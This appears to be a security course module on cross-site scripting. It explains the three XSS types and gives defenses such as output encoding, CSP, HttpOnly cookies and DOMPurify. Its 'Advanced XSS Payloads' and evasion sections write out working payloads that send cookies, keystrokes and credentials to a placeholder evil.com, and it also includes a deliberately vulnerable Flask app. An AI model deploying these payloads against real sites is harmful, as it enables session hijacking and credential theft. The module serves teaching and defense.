# Cross-Site Scripting (XSS)
---
## What is XSS?

Cross-Site Scripting (XSS) is a type of security vulnerability that allows an attacker to inject malicious code (usually client-side scripts) into web applications. This code is then executed by the victim's web browser, enabling the attacker to hijack user sessions, deface websites, or redirect users to malicious sites.

---
## Types of XSS

1. **Reflected XSS**: The malicious script is reflected off the web application to the victim's browser. This occurs when user input is immediately returned by the web application without proper validation
1. **Stored XSS**: The malicious script is stored on the target server (e.g., in a database) and is served to the victim's browser when the vulnerable page is requested
1. **DOM-based XSS**: The malicious script is executed as a result of modifying the Document Object Model (DOM) environment in the victim's browser
---
## Reflected XSS Example

Suppose a website has a search function that takes user input and displays the results on the same page without proper validation.

```html
http://example.com/search?query=<script>alert('XSS')</script>
```

When a victim visits this URL, the malicious script `<script>alert('XSS')</script>` will be executed in their browser, displaying an alert dialog.

---

## Stored XSS Example

Consider a web application that allows users to post comments on a blog. If the application fails to sanitize user input, an attacker can inject a malicious script into the comment section.

```javascript
<script>document.location='http://evil.example.com/steal.php?cookie='+document.cookie</script>
```

When a victim views the page with the malicious comment, their session cookie will be sent to the attacker's server, potentially exposing their session.

---

## DOM-based XSS Example

Suppose a website has a client-side script that updates the page URL based on user input without proper validation.

```javascript
var hash = window.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
```

An attacker can craft a URL like:

```http
http://example.com/#<script>alert('XSS')</script>
```

When a victim visits this URL, the malicious script will be executed in their browser.

---

## XSS Attack Consequences

- Stealing session cookies and hijacking user sessions
- Keylogging and capturing sensitive information
- Webcam and microphone hijacking
- Website defacement
- Phishing and social engineering attacks
- Spreading malware and drive-by downloads

---

## Preventing XSS: Input Validation

- Validate and sanitize all user input before displaying it on the page
- Use appropriate encoding and escaping functions (e.g., htmlspecialchars in PHP)
- Implement strict input validation rules (e.g., whitelisting, blacklisting)
- Use secure coding practices and follow the principle of least privilege

---

## Preventing XSS: Output Encoding

- Encode user input before displaying it in the browser
- Use the appropriate encoding function for the context (e.g., HTML, JavaScript, CSS)
- Example in PHP:

```javascript
// Escape user input for HTML
$userInput = htmlspecialchars($untrustedData, ENT_QUOTES, 'UTF-8');
```

---

## Preventing XSS: Content Security Policy (CSP)

- A browser security mechanism that helps mitigate XSS attacks
- Allows developers to define a whitelist of trusted sources for resources
- Example CSP header:

Content-Security-Policy: default-src 'self'; script-src 'self' [https://trusted.example.com](https://trusted.example.com)

This policy allows scripts only from the same origin and [https://trusted.example.com](https://trusted.example.com)

---

## Preventing XSS: HttpOnly Cookies

- Cookies marked with the HttpOnly flag are not accessible via client-side scripts
- Helps prevent XSS attacks from stealing session cookies
- Example in PHP:

```javascript
setcookie('SessionID', $sessionId, time() + 3600, '/', '', true, true);
```

The last true sets the HttpOnly flag for the cookie.

---

## Preventing XSS: Secure Coding Practices

- Use secure coding frameworks and libraries
- Keep software up-to-date and apply security patches
- Implement the principle of least privilege
- Conduct regular security audits and penetration testing
- Educate developers on secure coding practices and XSS prevention

---

## XSS Detection and Testing

- Manual code review and testing
- Automated scanning tools (e.g., OWASP ZAP, Burp Suite)
- Penetration testing and ethical hacking
- Building secure coding practices into the development lifecycle

---

## XSS Attack Flow Diagram

![xss_attack_flow_diagram](svg/courses/security/cyber-attacks-and-vectors/07_xss/xss_attack_flow_diagram.svg)

---

## Advanced XSS Payloads

```html
<!-- Cookie stealing -->
<script>
new Image().src="https://evil.com/steal?c="+document.cookie;
</script>

<!-- Keylogger injection -->
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://evil.com/log?key=' + e.key);
});
</script>

<!-- Form hijacking - steal credentials -->
<script>
document.forms[0].action = 'https://evil.com/phish';
</script>

<!-- Session riding - perform actions as victim -->
<script>
fetch('/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>

<!-- Phishing overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
background:white;z-index:9999">
<h2>Session expired. Please login again:</h2>
<form action="https://evil.com/phish">
Username: <input name="user"><br>
Password: <input name="pass" type="password"><br>
<button>Login</button></form></div>
```

---

## XSS Filter Evasion Techniques

Attackers bypass basic filters using encoding and obfuscation:

```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Event handlers (no script tags needed) -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>

<!-- HTML encoding -->
<a href="javascript:alert('XSS')">Click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')">Click</a>

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Template literals (modern JS) -->
<script>alert`XSS`</script>
```

This is why blocklist-based filtering is insufficient.

---

## Vulnerable vs Secure: Complete Example

```python
# VULNERABLE Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    comments.append(comment)
    return 'Comment added'

@app.route('/comments')
def show_comments():
    # VULNERABLE: Directly inserting user input into HTML
    html = '<h1>Comments</h1>'
    for c in comments:
        html += f'<p>{c}</p>'  # No escaping!
    return html
```

```python
# SECURE Flask application
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    comments.append(comment)
    return 'Comment added'

@app.route('/comments')
def show_comments():
    # SECURE: Use templates with auto-escaping
    return render_template('comments.html', comments=comments)
    # Jinja2 auto-escapes by default:
    # <p>{{ comment }}</p>
    # Converts <script> to &lt;script&gt;
```

---

## Content Security Policy (CSP) In Depth

```bash
# Strict CSP that prevents most XSS
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    report-uri /csp-report;
```

![strict_csp_that_prevents_most_xss](svg/courses/security/cyber-attacks-and-vectors/07_xss/strict_csp_that_prevents_most_xss.svg)

---

## Nonce-Based CSP for Inline Scripts

```html
<!-- Server generates a random nonce per request -->
<!-- HTTP Header: Content-Security-Policy: script-src 'nonce-abc123' -->

<!-- This WILL execute (has correct nonce) -->
<script nonce="abc123">
    console.log("Legitimate script");
</script>

<!-- This will NOT execute (no nonce / wrong nonce) -->
<script>
    alert("XSS attempt blocked by CSP!");
</script>

<!-- Injected by attacker - also blocked -->
<script nonce="guessed-wrong">
    document.location = "https://evil.com";
</script>
```

---

## Real-World XSS Case Studies

| Incident          | Year | Impact                                     |
|-------------------|------|--------------------------------------------|
| Samy Worm (MySpace)| 2005 | 1M friend requests in 20 hours via stored XSS|
| Twitter StalkDaily | 2009 | Self-propagating XSS worm on Twitter        |
| eBay              | 2015 | Stored XSS in product listings              |
| British Airways   | 2018 | Magecart XSS stole 380K payment cards       |
| Fortnite          | 2019 | XSS could hijack player accounts            |

---

## Automated XSS Detection

```bash
# OWASP ZAP - automated scanner
# zap-cli active-scan http://target.com

# Burp Suite Scanner - commercial tool
# Excellent at finding reflected and stored XSS

# XSStrike - dedicated XSS scanner
# python3 xsstrike.py -u "http://target.com/search?q=test"

# Dalfox - parameter analysis and XSS scanning
# dalfox url "http://target.com/search?q=test"

# Static analysis
# For JavaScript: ESLint with security plugin
# npm install eslint-plugin-security
# For Python: bandit
# For PHP: phpcs-security-audit
```

---

## DOMPurify: Client-Side Sanitization

```javascript
// Install: npm install dompurify
import DOMPurify from 'dompurify';

// Sanitize user-generated HTML content
const dirty = '<img src=x onerror=alert("XSS")><b>Bold text</b>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<b>Bold text</b>'
// The malicious img tag is stripped

// Allow specific tags
const config = {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'title']
};
const safeHTML = DOMPurify.sanitize(userInput, config);
```

---

## Exercise: XSS Lab

1. Build a vulnerable comment board (Flask/Express)
2. Demonstrate all three XSS types:
   - Reflected: Search parameter echoed without encoding
   - Stored: Comment with `<script>` tag saved to database
   - DOM-based: Fragment identifier used in `innerHTML`
3. Craft payloads that:
   - Steal cookies and send to your listener (`nc -l 8888`)
   - Inject a fake login form
   - Modify page content
4. Implement defenses one at a time and test each:
   - Output encoding (template auto-escaping)
   - Content Security Policy header
   - HttpOnly cookie flag
   - DOMPurify for user-generated HTML
5. Test with XSStrike to verify all XSS vectors are closed

## Conclusion

XSS is a critical security vulnerability that can have severe consequences. Web developers must implement appropriate security measures, including input validation, output encoding, CSP, secure coding practices, and regular security testing to prevent XSS attacks and protect their applications and users.
